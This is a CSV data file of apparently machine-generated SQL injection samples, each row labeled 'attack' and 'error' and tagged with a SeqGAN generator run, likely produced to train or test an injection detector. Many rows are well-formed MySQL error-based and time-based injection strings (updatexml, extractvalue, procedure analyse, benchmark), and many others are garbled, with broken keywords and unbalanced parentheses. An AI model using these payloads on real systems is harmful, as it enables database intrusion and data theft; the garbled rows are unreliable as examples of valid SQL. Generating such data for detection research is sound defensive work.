attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1869
attack,"abnte  (  e  (  0x2e,0x7171706a71,  (  (  9627,concat  (  (  (  1808  =  (  (  0x5c,  (  (  (  select   (  6804  =  (  (  3393,1   )    (  else,8083  g  =  'ina",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1870
attack,"1%"",8666  2162 where extractvalue  (  (  9627,concatt  (  (  0x2e,0x7171706a71,  (  benchmark  (  (  (  5000000,md5  (  0x5c,  (  select   (  elt  (  elt  0x2e,md5  (  0x2e,0x717a767a71  0x7171706a71,  (  (  select 7997  (  (   (  (  4415  =  (  1808)  (  (  0x2e,m(  (  (  (  benchmark  (  (  5000000,md5  (  0x2e,0x7171706a71,  (  (  benchmark  (  (   (  (  (  case when",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1871
attack,"exextractvalueal_namon anal  )  e  =  6166  =  (  (  1297  =  (  (  0x5c,0x7171706a71,  (  select   (  7982  =  (  1297,1   (  case when  (  0x5c,0x7171706a71,  (  tt  (  5000000(  (  0x2e,0x717a767a71  ,  (  select   (  elt  (  elt  (  7982  =  (  (  (  9393  =  (  0x5c,  (  (  5000000(  (  0x5c,0x7171706a71,  (  benchmark  (  (  select   (  2446  )  )  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1872
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1873
attack,"1%""   )    (  extractvalue  (  (  (  (  7050  (  (  (  1808,8868  (  (  (  (  5000000(  (  (  (  (  (    (  0x5c,  (  (  (  (  benchmark  (  (  (  benchmark  (  (  5000000(  (  (  (  (  (  (  0x5c,0x7171706a71,  (  (  benchmark  (  5000000,0x7171706a71(  (  (  (  (  (  (  select   (  elt  (  el  3393  =  7050  (  3393,  (  (  8862(  (  (  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1874
attack,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1875
attack,"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""kgnmnn"" like ""gkk'  =  '"" like ""k&'  =  'k--Pn"" like ""ezhzq",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1876
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1877
attack,"1%'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1878
attack,"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""O8666mAND proceduenal  )  )  )  )   then )  ) else cast  (  (  (  (  1808,concat  (  =  (  =  (  (  (  e  (  select   (  elt  (  elt  (  1808  =  5704  (  (  0x5c,  (  benchmark  (  (  benchmark  (  5000000(  (  3393,0x7171706a71,  (  select   (  elt   (  (  elt  (  e  (  (  1808  =  (  3393,0x7171706a71(  (  9627,",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1879
attack,1%pk,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1880
attack,"' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and 'zxxAz  (  select   (  case when   (  (  elt  (  elt  (  3393  =  (  7982,1   "" like "")   ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1881
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1882
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1883
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ''  =  'k",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1884
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1885
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1886
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1887
attack,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1888
attack,"1%""  )   or extractvalue  (  (  8862,md5  (  (  (  (  (  0x5c,  (  select   (  )  elt  (  elt  (  0x5c,  (    (  3393,  (  (  benchmark  (  (  =  5883  (  (  (  3393,concat  (  (  (  (  0x2e,md5  (  0x2e,md5  (  0x2e,0x7171706a71,  (  select   (  elt  (  e  (  1808,concat  (  0x4b774c75   end  (  elt  (  elt  (  1759  =",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1889
attack,"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1890
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1891
attack,"1%"",updatexml  (  (  3393,concat  (  (  (  0  =  (  (  (  7982,concat  (  (  (  0x5c,0x7171706a71,  (  benchmark  (  (  benchmark  (  (  (  5000000(  0x5c,0x7171706a71,  (  benchmark  (  5000000(  (  0x2e,0x7171706a71,  (  (  (  (  (  (  (  select   (  elt  (  0x5c,0x7171706a71,  (  select   (  ua  elt  (  1724    =  (  (  1808  =  (  8841  (  0x2e,md5  (  select   (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1892
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  'kfhojnn0x5c=  (  1   (  (  (  elt  (  elt  (  0x2e,0x7171706a71,  (  5000000(  (  0x5c,  (  benchmark  (  (  5000000(  (  (  select   (  elt  (  emdual--)    )     )  7757  extractvalue  (  benchmark  (  (  7982,concat  (  (  (  0x2e,md5  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  8841concat  (  t  (  5000000 0  (  (  0x5c,0x7171706a71,  (  0x2e",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1893
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1894
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1895
attack,"1%"",=  )  select   (  4774  =  (  =  9490  (  (  (  0x2e,0x7171706a71,  (  (  select   (  elt  (  elt  (  7982  =  (  7982,1   )    (  extractvalue  (  (  (  1297,md5  (  benchmark  (  (  (  benchmark  (  (  (  2917  (  (  0x5c,0x7171706a71,  (  (  select   (  5847  =  case   )    (  extractvalue  (  9627,  (  benchmark  (  (  5000000(  (  5000000,md5  (  0x2e,0x7171706a71,",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1896
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  'k",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1897
attack,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1898
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1899
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1900
attack,"1"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""e%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1901
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1902
attack,"1%""   )    usex  (  select   (  1812  (  3393  (  (  (  0x4b774c75   (  8375  (  3393,concat  (  (  0x5c,  (  select   (  e   (  (  (  elt  al  )  =  1759  (  (  5000000(  (  0x2e,md5  (  (  0x5c,  (  (  (  7982,1   )    (    (  select   )  select   (  )   from dual  )   end  (  elt  (  1297  =  (  (  (  7982  =  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1903
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1904
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1905
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1906
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1907
attack,"1%',procedure analyse  u  elt  (  1808,concat  (  (  0x2e,0x7171706a71,  (  select   (  )  e  (  0x2e,mdual  )  =  (  (  2917  =  (  0x5c,  (  (  0x5c=  4241  1535  )   (  4568  (  (  (  0x2e,md5  (  (  select   (  5423  =  (  elt  (  select   (  )  elt  (  e  (  1808  =  (  (  1808,concat  (  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1908
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1909
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1910
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1911
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1912
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and """"  =  ""%g'  =  'k5nzmw",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1913
attack,"1%'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1914
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""kbnes  (  select   (  elt 0 al  elt   )    (  ua  )  1808  (  =  (  3393,1   (  extractvalue  (  9255,md5  (  0x2e,0x7171706a71(  (  select   (  )   from d 0 0 from dual  )   end  (  (  elte  el  (  0x4b774c75   end  (  (  (  elt  (  elt  (  1808  =  (  3393,md5  (  (  0x2e,0x7171706a71,  (  (  1759=  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1915
attack,"1%'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1916
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1917
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1918
attack," AND proceedrease  (  elt  elt  7982  =  (  1 0 and updatexml  (  (  (  (  (  (  0x5c,0x7171706a71,  (  (  5000000(  (  (  7982=  (  6461  =  (  updatexml  (  (  (  3393,1   )    (  extractvalue  (  (  3393,concat  (  (  (  0x2e,0x7171706a71,0x7171706a71,  (  (  =  (  9255,concat  (  (  (  (  3393  =  (  (  (  0x2e,md5  (  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1919
attack,"1 and updatexml  (  (  (  0x2e,0x7171706a71,  (  select   (  (  elt  e    (  e  (  (  0x5c,(  (  (  1808,1   )    (  extractvalue  (  (  3393,concat  (  (  (  2917  =  ut  (  5000000,md5  (  3393,md5  (  (  select   (  elt  elt  (  (  7982  =  (  3393,md5  (  (  0x5c,  (  (  benchmark   (  9667  (  (  3393  =  (  (  (  benchmarkd",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1920
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""b'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ''  =  'kgphkNqcsZmhmzq",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1921
attack,"1%0x717a767a71%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1922
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1923
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1924
attack,"1%'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1925
attack,"1%""   )    AND 'i'  )  extractvalue  (  (  (  (  (  benchmark  (  (  (  7982,concat  (  0x5c,0x7171706a7158830x7171706a71,  (  (  (  select   (  elt  (  elt  3393  =  (  (  0x5c,  (  (  (  select   (l  (  7982  =  (  1808,md5  (  (  0x5c,0x7171706a71,  (  (  select   (  7997  )  (  (  (  1297  =  (  (  3393,concat  (  (  (  0x2e,0x7171706a71,  (  select   (   (  6581",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1926
attack,"1%1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1927
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1928
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1929
attack,1%'  =  '%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1930
attack,"1%""   )    AND 'i'  =  1 updatexml  (  3393,md5  (  0x2e,0x7171706a71,  (  (  5000000,1  select 2501  (  (  (  0x5c,0x7171706a71,  (  select   (  (  elt  (  1297  =  5777  (  7982,1   )    uas)    )     )  1  (  select extractvalue  (  (  (  (  1759(  3393,concat  (  (  5000000(  (  (  7982  =  (  8862,md5  (  (  (  0x5c,(  (  select   (  elt  (  e",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1931
attack,"1%""   )    AND procedue   (  5423  (  elte  1724  =  5433  (  3393,m(  (  (  3393,  (  0x5c,  (  (  select   (  elt  (  elt  )  select 0 0 from d5464  (   (   (  4774  (  (  elt  elt  (  5000000,md5  (  (  0x2e,0x7171706a71,md5  (  select   (  elt  e  (  2917  =  (  (  (  0x2e,0x7171706a71,  (  9255,md5",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1932
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1933
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1934
attack,"select   (  case when   (  1812  (  case when   (  (  =  (  elt  (  e(  e  l  (  5000000,md5  (  select   (  (  elt  (  e  (  0x2e,0x7171706a71,,  (  benchmark  (  5000000(  (  0x2e,0x7171706a71,  (  select   (  elt  (  elt  (  (  1297  =  (  7982,  (  (  select   (  )  elt  (  e  (  7982  =  3393,  (  (  2917,concat  (  (  0x2e,0x7171706a71,  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1935
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ''  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1936
attack,"1"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""USGINqbzmq",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1937
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1938
attack,"1%""   )    )    FROM booleaddrese  (  (  elt  (  elt  (  5000000(  (  9627,m5  (  (  select   (  (  elt  (  case when   (  (  elt  (  7982  =  (  1808,concat  (  (  0x2e,md5  extractvalue  (  5000000(  (  0x2e,0x7171706a71,  (  benchmark  (  5000000(  (  0x5c,0x7171706a71,  (  benchmark  (  (  benchmark  (  (  5000000,md5  (  8862(  (  0x5c,  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1939
attack,"1%""   )    (  'USERN0x7171706a711  )  (  (  (  (  1 0 or extractvalue  (  (  (  (  1808,concat  (  (  (  0x5c,0x7171706a71,  (  select   (  e  (  elt  7982  =  3393  (  (  1049  =  (  (  7982,0x717a767a71   (  (  4660  =  3393,0x7171706a71,  (  (  =  (  3393,1   )    uan--",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1940
attack,"1%""   )    )     extractvalue  (  9627,concat  (  (  (  (  0x5c,0x7171706a71,  (  select   (  elt   (  elt  (  7982  =  3393,6212  (  (  5000000,md5  (  (  1 a  (  elt  )  50000000x5c,0x7171706a71,  (  (  select   (  elt  (  elt  (   (   0 from   (  (  (  el  (  1808  =  (  (  0x5c,  (  0x2e,0x7171706a71,  (  select   (  =  7050  (  elt  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1941
attack,"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1942
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1943
attack,"select   (  case when   (  9393  (  (  2917concat  (  (  0x2e,md5  (  0x5c,  (  select   (  elt  (  elt  (  5000000,md5  (  0x5c,  (  9627,md5  (  (  1808,concat  (  (  (  0x5c,  (  (  benchmark  (  select   (  )  e(  elt  (  e  (  (  1297  )  (  0x5c,0x7171706a71,  (  9788,1   (  2501  (  (  (  3393,concat  (  (  (  select   (  el",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1944
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1945
attack," AND where or  extractvalue  (  (   (  4568  (  (  (  benchmark  (  (  0x5c,0x7171706a71,  (  select   (  elt  )  0x2e,0x7171706a71,  (  benchmark  (  (  0x5c,  (  =  (  3393,1   )    AND 'i'  =  1 extractvalue0x7171706a71u  (  (  select   (  e  )  elt  (  e  (  select   (  elt  elt  (  (  1297  =  (  benchmark  (  (  5000000,md5  =  7636  (  5000000,md5  (  0x4b774c75   or  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1946
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1947
